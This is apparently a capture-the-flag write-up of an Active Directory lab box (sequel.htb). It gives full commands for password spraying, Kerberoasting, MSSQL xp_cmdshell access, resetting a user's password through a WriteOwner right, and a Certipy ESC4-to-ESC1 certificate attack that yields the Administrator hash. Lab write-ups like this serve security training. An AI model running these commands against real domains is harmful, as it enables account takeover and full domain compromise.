![image](https://github.com/user-attachments/assets/0a3c6abc-072d-485c-9cd5-94f9d60553f2)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Enumeration

Since the box follows a real-life pentesting scenario, we were provided with credentials:

![image](https://github.com/user-attachments/assets/02408ea5-8926-4454-8daa-ddfb0c30b528)

## Port scan:

I began the enumeration phase by performing a full port and service scan using `nmap`. The scan revealed several open ports on the target host.

```
nmap -p- -A -T4 10.10.11.51 -v -Pn -oN escacpe2_nmap
```

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-26 10:57:55Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
|_SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
|_ssl-date: 2025-04-26T10:59:36+00:00; -3s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-26T10:59:35+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
|_SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-26T08:10:15
| Not valid after:  2055-04-26T08:10:15
| MD5:   7b7e:518a:fae0:7c7b:9642:9f73:f7f2:7a04
|_SHA-1: 55fb:658d:1c26:83dc:4993:ab59:7260:c542:5fbd:397f
|_ssl-date: 2025-04-26T10:59:36+00:00; -1s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-26T10:59:36+00:00; -3s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
|_SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-26T10:59:35+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
|_SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Supported Methods: POST OPTIONS
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Supported Methods: HEAD OPTIONS
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
49743/tcp open  msrpc         Microsoft Windows RPC
49822/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-04-26T10:58:58
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -2s, deviation: 0s, median: -2s
```

From the scan results, I observed a domain `sequel.htb` and a subdomain `dc01.sequel.htb` associated with the target. I added both of these entries into my `/etc/hosts` file for easier access during further enumeration.

## SMB Enumeration

Using the provided credentials, I attempted SMB enumeration to list all available shares accessible by the user `rose`. I used `netexec` for this, which revealed two interesting shared folders along with the default ones:

- Accounting Department
- Users

![image](https://github.com/user-attachments/assets/ddfea3b0-c1d9-417e-b28e-59f4dbbb7e1d)

After confirming the permissions, I used `smbclientng` to interact with the shares:

```
smbclientng -u rose -p KxEPkKe6R8su --target dc01.sequel.htb
```

Inside the "Accounting Department" share, I found two Excel files and downloaded both of them for further analysis:

![image](https://github.com/user-attachments/assets/579befbd-7a86-4efe-9d04-ecb3b13f49a8)

Enumeration of the "Users" directory didn't reveal much useful information:

![image](https://github.com/user-attachments/assets/67acc965-9a90-470b-b5fc-a05e3e26b52d)

After downloading the Excel files, I started analyzing them. The `accounting_2024` file appeared to be a standard accounts spreadsheet:

![image](https://github.com/user-attachments/assets/15a09fa2-6f6d-4920-bc66-0bad49cc43ed)

However, when I tried opening the second file, it showed a ZIP error. Checking the file type revealed that it was actually a zipped file:

![image](https://github.com/user-attachments/assets/739b2c48-e4a6-43e0-b081-6b2c1b10e5b2)

### Password policy

Next, I enumerated the password policy of the domain to assess if I could perform a brute-force or password spray attack safely, without causing unnecessary account lockouts.

The results showed that **no account lockout protections** were enabled, meaning brute-force attacks could be performed without restrictions.

```
nxc smb sequel.htb -u rose -p KxEPkKe6R8su --pass-pol
```

![image](https://github.com/user-attachments/assets/c0c0ccf8-184c-4c85-bb52-f680a73174a3)

I then attempted spraying **Rose's password** across all the valid domain users, but it was only valid for Rose.
This confirmed that password reuse wasn't occurring among the other users.

![image](https://github.com/user-attachments/assets/59f7f13e-a485-443f-8b4d-053dee8b2787)

### Bloodhound

Next, I leveraged **BloodHound** to gather detailed information about Active Directory objects and look for potential escalation paths from the compromised user `rose`.

```
bloodhound-python -u rose -p KxEPkKe6R8su -d sequel.htb -dc dc01.sequel.htb -ns 10.10.11.51 -c All --zip
```

After importing the results and analyzing the graphs, I checked for any direct privilege escalation paths from `rose`. Unfortunately, there were no clear escalation paths available at this point.

![image](https://github.com/user-attachments/assets/9e07defe-df47-4401-8369-b57575b99898)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Lateral movemnet

## AS-REP Roasting

After completing the basic enumeration steps, I moved into the lateral movement phase.

I started with attempting an **AS-REP roasting** attack to find any users that have the `Do not require Kerberos preauthentication` flag set, which would allow me to grab their encrypted TGT without needing valid credentials.

```
nxc ldap sequel.htb -u rose -p KxEPkKe6R8su --asreproast asrep.out
```
![image](https://github.com/user-attachments/assets/2153c0a0-068c-4a96-bb93-29e6af23f3a0)

However, there were no users found that were vulnerable to AS-REP roasting:

## Kerberoasting

Next, I moved on to perform a **kerberoasting attack**. This attack allows us to request TGS (Ticket Granting Service) hashes for service accounts in the Active Directory environment, which can potentially be cracked offline.

I ran the following command to grab the TGS hashes for all eligible service accounts:

```
nxc ldap sequel.htb -u rose -p KxEPkKe6R8su --kerberoast ker.out
```

The attack successfully yielded hashes for two accounts:

- ca_svc
- sql_svc

![image](https://github.com/user-attachments/assets/8774564e-6f27-450e-96fd-5e42de79037a)

However, despite grabbing the hashes, I was unable to crack them, which indicates that these accounts are secured with strong, complex passwords.

![image](https://github.com/user-attachments/assets/edc822ab-5b0e-4ae0-8f02-1d4f8a92a5bb)

## MSSQL

Continuing with the enumeration, I turned my attention to the **MSSQL** server. I discovered that the user `rose` had access to the MSSQL service. To interact with the MSSQL server and potentially achieve code execution, I used `mssqlclient.py`.

The connection was successful, and I was able to authenticate with the server, but I encountered an issue when trying to execute commands on it.

```
mssqlclient.py sequel.htb/rose:'KxEPkKe6R8su'@sequel.htb -windows-auth
```

![image](https://github.com/user-attachments/assets/35528767-3cd1-47a4-b2c4-7816e3592904)

Although I had access to the MSSQL server, I couldn't gain access to the `cmd_shell`. To gather more information, I enumerated the databases on the server. I found four databases in total but didn't uncover anything of interest.

![image](https://github.com/user-attachments/assets/9f165b37-1970-49f6-9864-37c647ca555d)


### WINRM

I also attempted to gain command execution via **WINRM**, but encountered an issue because rose wasn't part of the remote management user group. As a result, I was unable to authenticate and connect through WINRM.

![image](https://github.com/user-attachments/assets/66499ba3-a45b-4d1b-a0f0-b5281dfb79e7)


## Unzipped Excel Files

After failing to gain shell access through the previous methods, I decided to investigate the unzipped Excel files further. While reviewing the `accounts.xlsx` file, I discovered that one of the files contained **plain-text credentials**.

![image](https://github.com/user-attachments/assets/f886abe0-6b9b-493b-811f-d186f8e5786b)

The file contained credentials for 4 users. Out of these, 2 credentials were valid: `sa` and `oscar`. Although the sa account wasn't valid on the domain, it was valid locally.

![image](https://github.com/user-attachments/assets/acf22bb3-22a6-4906-b5ec-5297dec62234)

![image](https://github.com/user-attachments/assets/e5ad6a2e-3909-4fda-9e61-9cc288482270)

## Initial Access

After reattempting the authentication with MSSQL using `sa` account, I found that this time I could run xp_cmdshell commands as the `sql_svc` user:

![image](https://github.com/user-attachments/assets/d7f92189-90f5-4902-a402-550489330ee3)

Taking advantage of this, I quickly set up my **Villian C2**, generated a payload, and executed it in the MSSQL session. Once the command was successfully executed, I received the reverse shell back on my C2 as the `sql_svc` user:

![image](https://github.com/user-attachments/assets/9995354d-d542-4c4c-89be-6df20999a00a)

![image](https://github.com/user-attachments/assets/85d7c0ce-c13f-4744-acb4-39bf83b9346d)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Privilege Escalation

## SQL_SVC -> Ryan

After establishing the active shell connection, I began enumerating the host to look for credentials and potential misconfigurations. While exploring the system, I found clear-text credentials for the **SQL_SVC** account in a configuration file located in the `SQL-2019` folder:

![image](https://github.com/user-attachments/assets/72746975-15c8-4af0-bd65-779596828e7f)

Although I already had access using the **SQL_SVC** account, I decided to perform a password spray across all users to check for any password reuse. This time, I discovered that the **Ryan** user was reusing the same password as the **SQL_SVC** account:

![image](https://github.com/user-attachments/assets/00bf9db3-301f-4217-bfd1-d4297cabc2a9)

With the credentials in hand, I used **WINRM** to authenticate and gain a shell as the **Ryan** user:

![image](https://github.com/user-attachments/assets/23ac574a-fafe-4014-8459-8a01be131c39)

## Ryan -> CA_SVC

After gaining access as **Ryan**, I revisited the **BloodHound** data for further enumeration. In the outbound object control section, I noticed that **Ryan** had **WriteOwner** access over the **ca_svc** user:

![image](https://github.com/user-attachments/assets/552f4c0b-f884-4075-a289-bdaf86452782)

This indicated that **Ryan** had the ability to modify the owner of the **ca_svc** user. In Active Directory, object owners can modify the object's security descriptors, regardless of the permissions on the object's DACL, allowing for significant control over the object.

To exploit this, I used **rpcclient** to change the password of the **ca_svc** user. I followed the steps below, which successfully changed the password:

```
$ rpcclient -U ryan sequel.htb        
Password for [WORKGROUP\ryan]:
rpcclient $> setuserinfo2 ca_svc 23 'Passw0rd@123#'
rpcclient $> exit
```

![image](https://github.com/user-attachments/assets/438a706b-d5bf-4acd-aaf2-45ad82269e50)

Since the password of **ca_svc** was being changed frequently due to multiple users targeting it, I decided to request a **TGT** for the **ca_svc** user to continue with further authentication via the **Kerberos** protocol:

```
getTGT.py sequel.htb/'ca_svc':'Passw0rd@123#' -dc-ip 10.10.11.51

export KRB5CCNAME=ca_svc.ccache
```

## CA_SVC -> Domain admin

At this point, with access to **ca_svc**, a member of the `Cert Publishers` group, I hypothesized that the final privilege escalation path could be tied to the certificate templates. To explore this, I used `Certipy` to identify any vulnerable certificate templates on the target host.

I ran the following command to search for vulnerable templates:

```
certipy-ad find -vulnerable -u ca_svc@sequel.htb -k -no-pass -target DC01.sequel.htb -stdout
```

```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
[*] Got CA configuration for 'sequel-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC01-CA
    DNS Name                            : DC01.sequel.htb
    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
    Certificate Validity End            : 2124-06-08 17:00:40+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireCommonName
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
```

The **Certipy** results revealed that the template `DunderMifflinAuthentication` is vulnerable to **ESC4** and that the **Cert Publishers** group, which ``ca_svc is part of, has privileges over this specific template. This vulnerability could be leveraged to escalate privileges to domain administrator.


### ESC4 exploitation:

With my `Cert Publishers` group access, I proceeded to exploit the **ESC4** vulnerability within the **DunderMifflinAuthentication** template.

- **Modify the ESC4 template**: I began by modifying the ESC4 vulnerability to ESC1, ESC2, and ESC3 while saving the current template to maintain backup:

```
certipy-ad template -u ca_svc@sequel.htb -k -no-pass -target DC01.sequel.htb -template DunderMifflinAuthentication -save-old
```

![image](https://github.com/user-attachments/assets/4eca9da4-229b-4a88-bb0a-82479d7ca248)

- **Template modification complete**: After modification, the template was now vulnerable to multiple escalation paths, opening up opportunities for further exploitation:

![image](https://github.com/user-attachments/assets/5a69fa38-1d71-47f1-8934-87ae0aa26161)

- **Exploitation via ESC1**: Following the modified template, I requested a certificate for the Administrator user:

```
certipy-ad req -u ca_svc@sequel.htb -k -no-pass -target DC01.sequel.htb -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn Administrator@SEQUEL.HTB
```

![image](https://github.com/user-attachments/assets/4b225eaa-4051-498c-b9eb-f35df34798c2)

- **Retrieve the password hash**: Once the certificate was saved, I used it to request the password hash for the Administrator user:

```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.51
```

![image](https://github.com/user-attachments/assets/95f62392-7f56-4703-92c7-3dfedaca6f19)

Finally, with the Administrator hash in hand, I gained access as Administrator and retrieved both flags.(pwn3d!🎉)🙂

![image](https://github.com/user-attachments/assets/76bc0a01-c4ef-4b11-913f-a73a0e089d17)
